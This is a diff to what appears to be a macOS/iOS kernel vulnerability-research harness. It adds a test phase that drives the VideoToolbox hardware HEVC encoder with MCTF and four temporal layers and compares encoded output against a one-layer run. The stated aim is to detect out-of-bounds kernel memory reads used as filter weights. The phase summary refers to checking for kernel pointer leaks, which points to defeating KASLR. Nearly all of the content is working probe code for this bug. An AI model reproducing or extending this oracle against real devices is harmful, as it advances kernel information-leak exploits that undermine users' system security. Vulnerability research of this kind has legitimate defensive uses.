@@ -24490,6 +24490,201 @@ new_modes:
                 }
             }
 
+            /* ---- 22e: MCTF output comparison oracle ---- */
+            rlog("\n--- 22e: MCTF output comparison (TL=1 vs TL=4) ---\n");
+            {
+                /* Encode identical frames twice: once with MCTF+TL=1 (safe)
+                 * and once with MCTF+TL=4 (potential OOB trigger).
+                 * If TL>2 triggers OOB reads, the kernel reads adjacent
+                 * memory as MCTF filter weights, causing different output.
+                 * Also run TL=4 twice to check if output is deterministic
+                 * (same KASLR = same OOB values = same output). */
+                uint8_t *out_tl1 = NULL;
+                uint8_t *out_tl4a = NULL;
+                uint8_t *out_tl4b = NULL;
+                size_t sz_tl1 = 0, sz_tl4a = 0, sz_tl4b = 0;
+
+                /* Create a reusable pixel buffer with known data */
+                CVPixelBufferRef test_pb = NULL;
+                CFMutableDictionaryRef test_pa = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                CFDictionaryRef test_ip = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(test_pa,
+                    kCVPixelBufferIOSurfacePropertiesKey, test_ip);
+                CFRelease(test_ip);
+                CVPixelBufferCreate(kCFAllocatorDefault,
+                    640, 480, kCVPixelFormatType_32BGRA,
+                    test_pa, &test_pb);
+                CFRelease(test_pa);
+
+                if (test_pb) {
+                    /* Fill with deterministic pattern */
+                    CVPixelBufferLockBaseAddress(test_pb, 0);
+                    uint8_t *px = (uint8_t *)CVPixelBufferGetBaseAddress(test_pb);
+                    size_t pxsz = CVPixelBufferGetDataSize(test_pb);
+                    for (size_t pi = 0; pi < pxsz; pi++) {
+                        px[pi] = (uint8_t)(pi * 7 + 13);
+                    }
+                    CVPixelBufferUnlockBaseAddress(test_pb, 0);
+
+                    /* Helper: encode 20 frames, concat all output */
+                    int configs[3][2] = {{1, 1}, {4, 1}, {4, 1}};
+                    uint8_t **outs[3] = {&out_tl1, &out_tl4a, &out_tl4b};
+                    size_t *szs[3] = {&sz_tl1, &sz_tl4a, &sz_tl4b};
+                    const char *names[3] = {"TL=1", "TL=4a", "TL=4b"};
+
+                    for (int ci = 0; ci < 3; ci++) {
+                        int tl = configs[ci][0];
+                        int lm = configs[ci][1];
+
+                        VTCompressionSessionRef ce = NULL;
+                        CFMutableDictionaryRef cs = CFDictionaryCreateMutable(
+                            kCFAllocatorDefault, 0,
+                            &kCFTypeDictionaryKeyCallBacks,
+                            &kCFTypeDictionaryValueCallBacks);
+                        CFDictionarySetValue(cs,
+                            CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                            kCFBooleanTrue);
+                        VTCompressionSessionCreate(kCFAllocatorDefault,
+                            640, 480, kCMVideoCodecType_HEVC,
+                            cs, NULL, NULL, NULL, NULL, &ce);
+
+                        if (ce) {
+                            VTSessionSetProperty(ce,
+                                CFSTR("EnableMCTF"), kCFBooleanTrue);
+                            CFNumberRef tln = CFNumberCreate(
+                                kCFAllocatorDefault, kCFNumberIntType, &tl);
+                            VTSessionSetProperty(ce,
+                                CFSTR("NumberOfTemporalLayers"), tln);
+                            CFNumberRef lmn = CFNumberCreate(
+                                kCFAllocatorDefault, kCFNumberIntType, &lm);
+                            VTSessionSetProperty(ce,
+                                CFSTR("MCTFLatencyMode"), lmn);
+
+                            /* Force constant QP for determinism */
+                            int qp = 30;
+                            CFNumberRef qpn = CFNumberCreate(
+                                kCFAllocatorDefault, kCFNumberIntType, &qp);
+                            VTSessionSetProperty(ce,
+                                CFSTR("MinAllowedFrameQP"), qpn);
+                            VTSessionSetProperty(ce,
+                                CFSTR("MaxAllowedFrameQP"), qpn);
+                            CFRelease(qpn);
+
+                            VTCompressionSessionPrepareToEncodeFrames(ce);
+
+                            /* Collect all output */
+                            size_t total_cap = 1024 * 1024;
+                            uint8_t *total_buf = (uint8_t *)malloc(total_cap);
+                            __block size_t total_sz = 0;
+
+                            for (int f = 0; f < 20; f++) {
+                                CMTime pt = CMTimeMake(f, 30);
+                                CMTime du = CMTimeMake(1, 30);
+                                VTCompressionSessionEncodeFrameWithOutputHandler(
+                                    ce, test_pb, pt, du, NULL, NULL,
+                                    ^(OSStatus os, VTEncodeInfoFlags fl,
+                                      CMSampleBufferRef sb) {
+                                        if (os == 0 && sb) {
+                                            CMBlockBufferRef bb =
+                                                CMSampleBufferGetDataBuffer(sb);
+                                            if (bb) {
+                                                char *dp = NULL;
+                                                size_t dl = 0;
+                                                if (CMBlockBufferGetDataPointer(
+                                                        bb, 0, &dl, NULL,
+                                                        &dp) == 0
+                                                    && dp && dl > 0) {
+                                                    if (total_sz + dl
+                                                        <= total_cap) {
+                                                        memcpy(
+                                                            total_buf + total_sz,
+                                                            dp, dl);
+                                                        total_sz += dl;
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    });
+                                usleep(20000);
+                            }
+
+                            VTCompressionSessionCompleteFrames(ce,
+                                kCMTimeInvalid);
+                            usleep(100000);
+
+                            *outs[ci] = total_buf;
+                            *szs[ci] = total_sz;
+                            rlog("  %s: %zu bytes encoded\n",
+                                names[ci], total_sz);
+
+                            CFRelease(tln);
+                            CFRelease(lmn);
+                            VTCompressionSessionInvalidate(ce);
+                            CFRelease(ce);
+                        }
+                        CFRelease(cs);
+                    }
+
+                    /* Compare outputs */
+                    rlog("\n  --- Output comparison ---\n");
+
+                    /* TL=4a vs TL=4b (same config, should be identical
+                     * if MCTF is deterministic) */
+                    if (out_tl4a && out_tl4b) {
+                        int diff_bytes = 0;
+                        size_t min_sz = sz_tl4a < sz_tl4b ?
+                            sz_tl4a : sz_tl4b;
+                        for (size_t bi = 0; bi < min_sz; bi++) {
+                            if (out_tl4a[bi] != out_tl4b[bi]) diff_bytes++;
+                        }
+                        rlog("  TL4a(%zu) vs TL4b(%zu): %d diff bytes "
+                             "(%s)\n",
+                            sz_tl4a, sz_tl4b, diff_bytes,
+                            diff_bytes == 0 ? "DETERMINISTIC" :
+                            "NON-DETERMINISTIC");
+                    }
+
+                    /* TL=1 vs TL=4a (different config — if MCTF OOB
+                     * reads cause different filter weights, sizes
+                     * and content will differ) */
+                    if (out_tl1 && out_tl4a) {
+                        int diff_bytes = 0;
+                        size_t min_sz = sz_tl1 < sz_tl4a ?
+                            sz_tl1 : sz_tl4a;
+                        for (size_t bi = 0; bi < min_sz; bi++) {
+                            if (out_tl1[bi] != out_tl4a[bi]) diff_bytes++;
+                        }
+                        rlog("  TL1(%zu) vs TL4a(%zu): %d diff bytes\n",
+                            sz_tl1, sz_tl4a, diff_bytes);
+
+                        /* Dump first 64 bytes of each for analysis */
+                        rlog("  TL1  first 32B:");
+                        for (size_t bi = 0; bi < 32 && bi < sz_tl1; bi++)
+                            rlog(" %02x", out_tl1[bi]);
+                        rlog("\n");
+                        rlog("  TL4a first 32B:");
+                        for (size_t bi = 0; bi < 32 && bi < sz_tl4a; bi++)
+                            rlog(" %02x", out_tl4a[bi]);
+                        rlog("\n");
+                    }
+
+                    /* Log MSE readback if available */
+                    rlog("  (CalculateMeanSquaredError result would go here"
+                         " if supported by HW encoder)\n");
+
+                    if (out_tl1) free(out_tl1);
+                    if (out_tl4a) free(out_tl4a);
+                    if (out_tl4b) free(out_tl4b);
+                    CVPixelBufferRelease(test_pb);
+                }
+            }
+
             rlog("\n=== Phase 22 Summary ===\n");
             rlog("Check output for MCTF-related properties and KPTR leaks.\n");
             rlog("--- Phase 22 complete ---\n");
